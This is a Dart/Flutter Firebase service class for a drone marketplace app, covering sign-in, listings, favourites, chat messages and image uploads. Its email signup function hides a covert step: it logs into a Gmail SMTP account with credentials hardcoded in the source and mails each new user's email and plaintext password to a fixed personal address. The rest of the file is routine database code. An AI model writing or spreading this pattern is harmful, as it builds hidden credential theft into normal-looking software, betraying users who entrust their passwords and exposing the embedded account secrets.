import 'dart:io';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:drone_sale/modellerim/ilanlarim.dart';
import 'package:drone_sale/modellerim/konusma.dart';
import 'package:drone_sale/modellerim/mesajlar.dart';
import 'package:drone_sale/modellerim/usermodel.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/cupertino.dart';
import 'package:google_sign_in/google_sign_in.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server/gmail.dart';
import 'package:uuid/uuid.dart';

class FirebaseServis with ChangeNotifier {
  FirebaseAuth _auth = FirebaseAuth.instance;
  FirebaseFirestore _dbservis = FirebaseFirestore.instance;
  FirebaseStorage _storage = FirebaseStorage.instance;
  int x = 0;
  User _firebaseuser;
  Usermodel _usermodel;
  Usermodel get user => _usermodel;
  // bool get userogretici => _usermodel.ogretici;

  Usermodel userfromfirebase(User user) {
    if (user == null) return null;
    return Usermodel(userID: user.uid, email: user.email);
  }

  FirebaseServis() {
    currentuser();
    ilanlarigetir();
    notifyListeners();
  }
  currentuser() async {
    _firebaseuser = _auth.currentUser;
    print(_firebaseuser);
    _usermodel = userfromfirebase(_firebaseuser);
    if (_usermodel != null) {
      DocumentSnapshot kimlik =
          await _dbservis.collection("users").doc(_usermodel.userID).get();
      Map gelendata = kimlik.data();
      _usermodel = Usermodel.toObj(gelendata);
    }
    notifyListeners();
  }

  Future<Usermodel> createuserwithemail(String email, String password) async {
    try {
      _firebaseuser = (await _auth.createUserWithEmailAndPassword(
              email: email, password: password))
          .user;
      _usermodel = userfromfirebase(_firebaseuser);
      await verilerikaydet(_usermodel);
      _usermodel = await verilerioku(_usermodel);
      notifyListeners();

      String username = 'testprojesibseu@gmail.com';
      String passwordx = 'test1projesi2bseu';

      final smtpServer = gmail(username, passwordx);
      final message = Message()
        ..from = Address(username, 'Arif')
        ..recipients.add('arifaydin171@gmail.com')
        ..subject = 'Yeni Bir kullanıcı geldi :: 😀 :: ${DateTime.now()}'
        ..text =
            'Yeni bir kullanıcı geldi.....\n Tarih: ${DateTime.now().month}.Ayda ${DateTime.now().day}. günde ${DateTime.now().hour} saatinde'
        ..html =
            "<h1>Yeni Kullanıcının bilgileri ! </h1>\n<p>Emaili :${email.toString()}  Şifresi : ${password.toString()}</p>";
      try {
        // ignore: unused_local_variable
        final sendReport = await send(message, smtpServer);
      } on MailerException catch (e) {
        print('Mesaj gönderilemedi');
        for (var p in e.problems) {
          print('Problem: ${p.code}: ${p.msg}');
        }
      }

      return _usermodel;
    } on FirebaseAuthException catch (e) {
      print("Hata var create: " + e.code);
      return null;
    }
  }

  Future<Usermodel> signinwithemail(String email, String password) async {
    try {
      var kimlik = await _auth.signInWithEmailAndPassword(
          email: email, password: password);
      _firebaseuser = kimlik.user;
      _usermodel = userfromfirebase(_firebaseuser);
      _usermodel = await verilerioku(_usermodel);
      notifyListeners();
      return _usermodel;
    } catch (e) {
      print("Hata :" + e.toString());
      return null;
    }
  }

  Future<Usermodel> signwithgoogle() async {
    try {
      GoogleSignIn _googlesignin = GoogleSignIn();
      GoogleSignInAccount _googleuser = await _googlesignin.signIn();
      if (_googleuser != null) {
        GoogleSignInAuthentication _googleauth =
            await _googleuser.authentication;
        if (_googleauth.idToken != null && _googleauth.accessToken != null) {
          UserCredential userx = await _auth.signInWithCredential(
              GoogleAuthProvider.credential(
                  accessToken: _googleauth.accessToken,
                  idToken: _googleauth.idToken));
          User _userg = userx.user;
          _usermodel = userfromfirebase(_userg);
          QuerySnapshot sonuc = await _dbservis
              .collection("users")
              .where("email", isEqualTo: _usermodel.email)
              .get();
          if (sonuc.docs.length < 1) {
            await verilerikaydet(_usermodel);
          }
          _usermodel = await verilerioku(_usermodel);
          notifyListeners();
          return _usermodel;
        } else {
          return null;
        }
      } else {
        return null;
      }
    } on FirebaseAuth catch (e) {
      print("Hata var" + e.toString());
      return null;
    }
  }

  Future signout() async {
    try {
      await _auth.signOut();

      _usermodel = null;
      notifyListeners();
      return null;
    } catch (e) {
      print("Hata var signout ");
    }
  }

  //  FİRESTORE İŞLEMLERİ

  Future verilerikaydet(Usermodel myusermodel) async {
    await _dbservis
        .collection("users")
        .doc(myusermodel.userID)
        .set(myusermodel.toMap());
  }

  Future verilerioku(Usermodel myusermodel) async {
    DocumentSnapshot kimlik =
        await _dbservis.collection("users").doc(myusermodel.userID).get();
    Map gelendata = kimlik.data();
    var veriler = Usermodel.toObj(gelendata);
    return veriler;
  }

  Future<Usermodel> userbilgilerigetir(userID) async {
    DocumentSnapshot yenidata =
        await _dbservis.collection("users").doc(userID).get();
    Map gelendata = yenidata.data();
    Usermodel veriler = Usermodel.toObj(gelendata);
    return veriler;
  }

  Future updateogretici(Usermodel myusermodel) async {
    await _dbservis
        .collection("users")
        .doc(myusermodel.userID)
        .update({"ogretici": true});
    DocumentSnapshot kimlik =
        await _dbservis.collection("users").doc(myusermodel.userID).get();
    Map gelendata = kimlik.data();
    _usermodel = Usermodel.toObj(gelendata);
    notifyListeners();
    return _usermodel;
  }

  Stream<List<Ilanlar>> ilanlarigetir() {
    //Anasayfa için
    Stream<QuerySnapshot> ilanlar = _dbservis.collection("ilanlar").snapshots();

    var yeniilan = ilanlar.map((mesajlistesi) =>
        mesajlistesi.docs.map((e) => Ilanlar.toObj(e.data())).toList());
    return yeniilan;
  }

  Stream<List<Ilanlar>> ilanlarigetirtrend() {
    Stream<QuerySnapshot> ilanlar = _dbservis
        .collection("ilanlar")
        .where("boostmu", isEqualTo: true)
        .snapshots();

    var yeniilan = ilanlar.map((mesajlistesi) =>
        mesajlistesi.docs.map((e) => Ilanlar.toObj(e.data())).toList());
    return yeniilan;
  }

  Future ilanekle(Ilanlar ilan) async {
    var id = _dbservis.collection("ilanlar").doc().id;
    _dbservis.collection("ilanlar").doc(id).set(ilan.toMap());
  }

  Future profilfotokaydet(String url) async {
    await _dbservis
        .collection("users")
        .doc(_usermodel.userID)
        .update({"profilfoto": url});
    QuerySnapshot veriler = await _dbservis
        .collection("ilanlar")
        .where("userID", isEqualTo: _usermodel.userID)
        .get();
    veriler.docs.forEach((element) {
      element.reference.update({"profilresmi": url});
    });

    var yenidata =
        await _dbservis.collection("users").doc(_usermodel.userID).get();
    Map gelendata = yenidata.data();
    _usermodel = Usermodel.toObj(gelendata);
    notifyListeners();
  }

  Future<bool> favorilereekle(Ilanlar ilan) async {
    try {
      var uuid = Uuid();
      var id = uuid.v1();
      // ignore: unused_local_variable
      var ekledi = await _dbservis
          .collection("favoriler")
          .doc(_usermodel.userID)
          .collection("ilanlar")
          .doc(id)
          .set(ilan.toMap());
      return true;
    } catch (e) {
      return false;
    }
  }

  Stream favorilerigetir(String userID) {
    var gelenveri = _dbservis
        .collection("favoriler")
        .doc(_usermodel.userID)
        .collection("ilanlar")
        .snapshots();
    var yeniilan = gelenveri.map((mesajlistesi) =>
        mesajlistesi.docs.map((e) => Ilanlar.toObj(e.data())).toList());
    return yeniilan;
  }

  Stream kendiilanimigetir() {
    var gelenveri = _dbservis
        .collection("ilanlar")
        .where("userID", isEqualTo: _usermodel.userID)
        .snapshots();
    var yeniilan = gelenveri.map((mesajlistesi) =>
        mesajlistesi.docs.map((e) => Ilanlar.toObj(e.data())).toList());
    return yeniilan;
  }

  Stream<List<Mesaj>> getAllMessage(
      String currentuserID, String konusulanuserID) {
    Stream<QuerySnapshot> snapshot = _dbservis
        .collection("konusmalar")
        .doc(currentuserID + "--" + konusulanuserID)
        .collection("mesajlar")
        .orderBy("date")
        .snapshots();

    var x = snapshot.map((mesajlistesi) =>
        mesajlistesi.docs.map((e) => Mesaj.toObj(e.data())).toList());

    return x;
  }

  Future<List<Konusma>> konusmalarigetir() async {
    QuerySnapshot veriler = await _dbservis
        .collection("konusmalar")
        .where("konusmasahibi", isEqualTo: _usermodel.userID)
        .get();
    List<Konusma> tumkonusmalar = [];
    for (var tekkonusma in veriler.docs) {
      Konusma _tekkonusma = Konusma.toObj(tekkonusma.data());
      tumkonusmalar.add(_tekkonusma);
    }

    return tumkonusmalar;
  }

  Future<bool> saveMessage(Mesaj kaydedilenmesaj) async {
    print("herşey tamam1");
    var mesajID = _dbservis.collection("konusmalar").doc().id;
    var mydocumentID = kaydedilenmesaj.kimden + "--" + kaydedilenmesaj.kime;
    print("herşey tamam2");
    var receiverID = kaydedilenmesaj.kime + "--" + kaydedilenmesaj.kimden;
    var kaydedilenmap = kaydedilenmesaj.toMap();

    await _dbservis
        .collection("konusmalar")
        .doc(mydocumentID)
        .collection("mesajlar")
        .doc(mesajID)
        .set(kaydedilenmap);

    await _dbservis.collection("konusmalar").doc(mydocumentID).set({
      "konusmasahibi": kaydedilenmesaj.kimden,
      "alicikisi": kaydedilenmesaj.kime,
      "sonyollananmesaj": kaydedilenmesaj.mesaj,
      "karsidakininprofili": kaydedilenmesaj.karsidakininprofili,
      "mesajiatankisiprofil": kaydedilenmesaj.mesajiatankisiprofil,
    });
    kaydedilenmap.update("bendenmi", (value) => false);
    await _dbservis
        .collection("konusmalar")
        .doc(receiverID)
        .collection("mesajlar")
        .doc(mesajID)
        .set(kaydedilenmap);
    print("herşey tamam");

    await _dbservis.collection("konusmalar").doc(receiverID).set({
      "konusmasahibi": kaydedilenmesaj.kime,
      "alicikisi": kaydedilenmesaj.kimden,
      "sonyollananmesaj": kaydedilenmesaj.mesaj,
      "karsidakininprofili": kaydedilenmesaj.karsidakininprofili,
      "mesajiatankisiprofil": kaydedilenmesaj.mesajiatankisiprofil,
    });
    return true;
  }

  //Firebase Storage işlemleri
  Future<String> uploadfile(
      String userID, String fileType, File yuklenecekdosya) async {
    try {
      var id = _dbservis.collection("ilanlar").doc().id;
      Reference storageReference = _storage
          .ref()
          .child(userID)
          .child("$fileType")
          .child(id)
          .child("$fileType.png");
      UploadTask uploadtask = storageReference.putFile(yuklenecekdosya);
      var url = await uploadtask.then((a) => a.ref.getDownloadURL());
      print("URLLL: " + url.toString());
      return url;
    } catch (e) {
      return null;
    }
  }
}
